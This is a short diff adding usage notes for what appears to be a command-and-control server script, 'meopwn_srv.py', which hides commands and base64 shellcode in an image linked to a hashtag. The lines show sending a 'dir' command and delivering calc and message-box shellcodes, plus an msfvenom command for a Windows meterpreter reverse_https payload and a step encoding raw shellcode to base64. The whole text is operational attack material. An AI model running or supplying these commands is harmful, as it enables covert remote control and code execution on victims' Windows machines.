@@ -1,0 +1,7 @@
+python3 meopwn_srv.py -hashtag 0fb8539d64f0899d2b0552fd2dde5328f5494d3a1bbad3dbcdbeafbb73c1fae4 -image grumpy.png -b -m "dir" -w                 
+python3 meopwn_srv.py -hashtag 0fb8539d64f0899d2b0552fd2dde5328f5494d3a1bbad3dbcdbeafbb73c1fae4 -image grumpy.png -s -f "shellcodes/calc.b64"  
+python3 meopwn_srv.py -hashtag 0fb8539d64f0899d2b0552fd2dde5328f5494d3a1bbad3dbcdbeafbb73c1fae4 -image grumpy.png -s -f "shellcodes/messageBox.b64"  
+
+payloads:
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https --payload-options
+base64 calc.raw > calc.b64
